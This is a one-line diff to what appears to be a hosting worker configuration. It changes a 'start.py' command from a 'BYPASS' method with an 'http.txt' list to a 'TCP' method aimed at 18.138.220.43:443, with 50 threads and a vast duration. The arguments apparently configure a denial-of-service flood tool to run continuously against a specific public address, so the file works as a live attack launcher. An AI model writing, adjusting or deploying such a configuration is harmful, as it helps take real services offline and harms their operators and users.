@@ -1,1 +1,1 @@
-worker: python3 start.py BYPASS 18.138.220.43 1 50 http.txt 30 10000000000000
+worker: python3 start.py TCP 18.138.220.43:443 50 10000000000000
